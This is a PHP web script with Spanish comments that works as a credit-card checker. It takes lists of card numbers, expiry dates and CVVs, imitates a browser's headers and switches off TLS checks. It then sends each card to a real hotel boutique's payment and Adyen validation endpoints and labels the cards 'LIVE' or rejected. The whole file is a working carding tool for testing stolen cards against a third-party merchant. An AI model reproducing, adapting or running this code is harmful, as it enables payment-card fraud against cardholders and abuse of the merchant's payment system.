<?php
ignore_user_abort(true);
error_reporting(0);
session_start();

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ==============================
// CONFIGURACIÓN
// ==============================
$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";

// ==============================
// FUNCIONES
// ==============================

function makeRequest($url, $data, $headers = [], $method = 'POST') {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip",
        "Connection: keep-alive",
        "X-Requested-With: XMLHttpRequest"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_ENCODING => 'gzip'
    ];
    
    if ($method === 'POST') {
        $options[CURLOPT_POST] = true;
        $options[CURLOPT_POSTFIELDS] = json_encode($data);
    }
    
    curl_setopt_array($ch, $options);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'success' => ($http_code >= 200 && $http_code < 300) && empty($error)
    ];
}

// ==============================
// VALIDACIÓN DE ENTRADA
// ==============================

if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ No se recibió lista...'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

$lista = trim($_GET['lista']);
$lista = str_replace([';',':','/','»','«','>','<','=>',' ',','], '|', $lista);
$parts = explode('|', $lista);

$parts = array_filter($parts, function($value) {
    return !empty(trim($value));
});

$parts = array_values($parts);

if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto. Esperado: Número|Mes|Año|CVV',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Formato: ' . htmlspecialchars(substr($lista, 0, 50))
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validación básica
if (empty($cc) || !preg_match('/^[0-9]{13,19}$/', $cc)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Número de tarjeta inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Número de tarjeta inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (empty($mes) || $mes < 1 || $mes > 12) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Mes inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Mes inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (strlen($ano) == 2) $ano = "20" . $ano;

// Tipo de tarjeta
$first_digit = substr($cc, 0, 1);
$cardType = "UNKNOWN";
if ($first_digit == '4') $cardType = "VISA";
if ($first_digit == '5') $cardType = "MASTERCARD";

$cardMasked = substr($cc, 0, 6) . '******' . substr($cc, -4);
$expiryMasked = sprintf('%02d', $mes) . '/' . substr($ano, -2);

// ==============================
// FLUJO DE VERIFICACIÓN (SIN CHECKOUT)
// ==============================

try {
    $time_start = microtime(true);
    
    // ===========================================
    // 1. SITE LOGIN - Solo para obtener token
    // ===========================================
    $site_login_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "password" => ""
    ];
    
    $site_result = makeRequest($api_endpoint . "/site_login.php", $site_login_data);
    
    if (!$site_result['success']) {
        throw new Exception("Error en conexión inicial: HTTP " . $site_result['http_code']);
    }
    
    $site_response = json_decode($site_result['response'], true);
    
    if (!$site_response || !isset($site_response['site_login_token'])) {
        throw new Exception("No se pudo obtener token de sesión");
    }
    
    $site_login_token = $site_response['site_login_token'];
    
    // ===========================================
    // 2. ADYEN VALIDATION - Validar tarjeta con Adyen
    // ===========================================
    $adyen_validation_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "order_number" => "",
        "order_token" => "",
        "card" => $cc,
        "month" => (int)$mes,
        "year" => $ano,
        "cvv" => $cvv,
        "adyen_key" => "",
        "adyen_version" => "_0_1_25",
        "validate_only" => true,  // Solo validar, no procesar
        "test_mode" => true       // Modo prueba si está disponible
    ];
    
    $adyen_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $adyen_validation_data);
    
    if (!$adyen_result['success']) {
        // Si falla el encriptado, probamos otra validación
        $validation_data = [
            "client_id" => $client_id,
            "promotion_id" => $promotion_id,
            "lang" => $api_locale,
            "site_login_token" => $site_login_token,
            "card_number" => $cc,
            "card_expiry_month" => (int)$mes,
            "card_expiry_year" => (int)$ano,
            "card_cvv" => $cvv,
            "card_type" => $cardType,
            "validation_only" => true
        ];
        
        $validation_result = makeRequest($api_endpoint . "/payment_validate.php", $validation_data);
        
        if (!$validation_result['success']) {
            throw new Exception("Error en validación de pago");
        }
        
        $validation_response = json_decode($validation_result['response'], true);
        
        if ($validation_response && isset($validation_response['status'])) {
            if ($validation_response['status'] == 'valid') {
                $response_time = round(microtime(true) - $time_start, 2);
                
                $html = '<span class="badge badge-success">✅ LIVE</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-light">' . $cardMasked . '</span> ➔ ' .
                       '<span class="badge badge-success">' . $response_time . 's</span>';
                
                echo json_encode([
                    'status' => 'live',
                    'message' => 'Tarjeta válida',
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'type' => $cardType,
                        'response_time' => $response_time,
                        'validation' => $validation_response
                    ]
                ], JSON_UNESCAPED_UNICODE);
                exit();
            } else {
                throw new Exception("Tarjeta inválida: " . ($validation_response['message'] ?? 'Rechazada'));
            }
        }
    } else {
        $adyen_response = json_decode($adyen_result['response'], true);
        
        // ===========================================
        // 3. VALIDAR CON ADYEN DIRECTAMENTE
        // ===========================================
        if ($adyen_response && isset($adyen_response['encryptedCardNumber'])) {
            // Usar los datos encriptados para validación
            $adyen_validate_data = [
                "client_id" => $client_id,
                "promotion_id" => $promotion_id,
                "lang" => $api_locale,
                "site_login_token" => $site_login_token,
                "payment_method" => "adyen",
                "card_type" => $cardType,
                "encryptedCardNumber" => $adyen_response['encryptedCardNumber'],
                "encryptedExpiryMonth" => $adyen_response['encryptedExpiryMonth'],
                "encryptedExpiryYear" => $adyen_response['encryptedExpiryYear'],
                "encryptedSecurityCode" => $adyen_response['encryptedSecurityCode'],
                "validate_only" => true,
                "amount" => "1.00",  // Monto mínimo para validación
                "currency" => "HKD"
            ];
            
            $adyen_validate_result = makeRequest($api_endpoint . "/adyen_validate.php", $adyen_validate_data);
            
            if ($adyen_validate_result['success']) {
                $validate_response = json_decode($adyen_validate_result['response'], true);
                
                if ($validate_response && isset($validate_response['status'])) {
                    $response_time = round(microtime(true) - $time_start, 2);
                    
                    if ($validate_response['status'] == 'success' || 
                        (isset($validate_response['resultCode']) && 
                         in_array($validate_response['resultCode'], ['Authorised', 'Authorized']))) {
                        
                        $html = '<span class="badge badge-success">✅ LIVE</span> ➔ ' .
                               '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                               '<span class="badge badge-light">' . $cardMasked . '</span> ➔ ' .
                               '<span class="badge badge-success">' . $response_time . 's</span>';
                        
                        echo json_encode([
                            'status' => 'live',
                            'message' => 'Tarjeta válida',
                            'html' => $html,
                            'data' => [
                                'card' => $cardMasked,
                                'expiry' => $expiryMasked,
                                'type' => $cardType,
                                'response_time' => $response_time,
                                'adyen_response' => $validate_response
                            ]
                        ], JSON_UNESCAPED_UNICODE);
                        exit();
                    } else {
                        $error_msg = isset($validate_response['refusalReason']) ? 
                                    $validate_response['refusalReason'] : 
                                    'Tarjeta rechazada';
                        throw new Exception($error_msg);
                    }
                }
            }
        }
    }
    
    // ===========================================
    // 4. VERIFICACIÓN CON AUTH SIMPLE
    // ===========================================
    $auth_check_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "action" => "auth_check",
        "card_number" => $cc,
        "exp_month" => $mes,
        "exp_year" => $ano,
        "cvv" => $cvv,
        "amount" => "0",
        "test" => true
    ];
    
    $auth_result = makeRequest($api_endpoint . "/payment_auth.php", $auth_check_data);
    
    $response_time = round(microtime(true) - $time_start, 2);
    
    if ($auth_result['success']) {
        $auth_response = json_decode($auth_result['response'], true);
        
        if ($auth_response) {
            // Verificar diferentes respuestas de éxito
            if (isset($auth_response['status']) && $auth_response['status'] == 'success') {
                $html = '<span class="badge badge-success">✅ LIVE</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-light">' . $cardMasked . '</span> ➔ ' .
                       '<span class="badge badge-success">' . $response_time . 's</span>';
                
                echo json_encode([
                    'status' => 'live',
                    'message' => 'Tarjeta válida',
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'type' => $cardType,
                        'response_time' => $response_time,
                        'auth_response' => $auth_response
                    ]
                ], JSON_UNESCAPED_UNICODE);
                exit();
            }
            
            // Si hay mensaje de error específico
            if (isset($auth_response['error'])) {
                throw new Exception($auth_response['error']);
            }
        }
    }
    
    // Si llegamos aquí, no se pudo verificar claramente
    throw new Exception("No se pudo determinar el estado de la tarjeta");
    
} catch (Exception $e) {
    $response_time = isset($time_start) ? round(microtime(true) - $time_start, 2) : 0;
    
    $message = $e->getMessage();
    
    // Clasificar el tipo de error
    $error_type = 'error';
    $badge_class = 'badge-danger';
    
    $rejection_patterns = [
        '/rechazado/i', '/declined/i', '/invalid/i', '/expired/i', 
        '/incorrect/i', '/not supported/i', '/cvv/i', '/security code/i',
        '/insufficient/i', '/limit/i', '/stolen/i', '/lost/i'
    ];
    
    foreach ($rejection_patterns as $pattern) {
        if (preg_match($pattern, $message)) {
            $error_type = 'rejected';
            $badge_class = 'badge-warning';
            break;
        }
    }
    
    $html = '<span class="badge ' . $badge_class . '">❌ ' . strtoupper($error_type) . '</span> ➔ ' .
           '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
           '<span class="badge badge-light">' . $cardMasked . '</span> ➔ ' .
           '<span class="badge badge-warning">' . htmlspecialchars($message) . '</span> ➔ ' .
           '<span class="badge badge-secondary">' . $response_time . 's</span>';
    
    echo json_encode([
        'status' => $error_type,
        'message' => $message,
        'html' => $html,
        'data' => [
            'card' => $cardMasked,
            'expiry' => $expiryMasked,
            'type' => $cardType,
            'response_time' => $response_time,
            'error_detail' => $message
        ]
    ], JSON_UNESCAPED_UNICODE);
}